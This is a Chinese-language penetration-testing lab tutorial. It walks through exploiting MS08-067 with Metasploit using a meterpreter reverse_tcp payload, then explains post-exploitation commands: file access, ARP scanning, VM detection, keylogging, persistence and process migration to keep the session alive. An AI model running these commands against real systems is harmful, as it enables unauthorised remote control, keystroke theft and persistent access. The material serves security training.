实验步骤


01

使用meterpreter payload


打开命令行，输入msfconsole启动msf，我们在这里依然使用ms08-067为例。


msf > use exploit/windows/smb/ms08_067_netapimsf exploit(ms08_067_netapi) > set RHOST 192.168.43.15msf exploit(ms08_067_netapi) > set target 34msf exploit(ms08_067_netapi) > set payload windows/meterpreter/reverse_tcpmsf exploit(ms08_067_netapi) > set LHOST 192.168.43.196msf exploit(ms08_067_netapi) > exploit


经过这几个步骤我们就可以使用meterpreter模块了，其实这个步骤上更以前没有什么差别，只是换成了meterpreter类型的payload。





02

meterpreter命令介绍


（1）首先我们先介绍meterpreter的文件系统命令


cd 、ls、cat、pwd、dir、mkdir、mv、rm、rmdir、edit这些命令的作用和linux系统对应的命令是一样的。但是它们并没有像linux命令中的可选参数选项（例：ls -a），这里的edit命令类似于linux系统中的vi命令，dir命令和windows的命令含义是一样的。meterpreter的文件系统命令还有lpwd、lcd命令，这两个命令针对的是主机的当前目录显示，和主机的目录切换，注意和cd、pwd命令区别开。download、upload命令，这两个命令很容易理解就是下载和上传命令upload命令：可以上传文件或文件夹到目标机器：



（2）arp_scanner，该模块主要用来进行arp扫描


meterpreter > run arp_scanner -r 192.168.20.0/24



（3）checkvm，该模块主要用来检测渗透主机是否位于虚拟机



（4）键盘记录


meterpreter > run post/windows/capture/keylog_recorder



（5）从目标主机获得所有网络共享等信息



（6）控制持久化

meterpreter > run persistence -X -i 20 3376 -r 192.168.20.16




（7）第七步：执行cmd



（8）getwd命令：可以获取当前目标机器的工作目录，也可以获得当前系统的工作目录：



（9）search命令：支持对远程目标机器上的文件进行搜索



（10）route命令：可以查看路由



（11）ps命令可以用来获取目标主机上正在运行的进程信息：



（12）execute命令：可以在目标机中执行文件



（13）migrate命令，将会话移植到explorer.exe这样，只要桌面一直运行，当前的meterpreter会话就不会中断。常常利用此命令将meterpreter移植到一些一直不会关闭的进程中，可以最大程度的保证meterpreter的寿命。（这里需要先用ps查看进程，migrate后跟的参数就是你查到的进程号）



进程迁移成功！
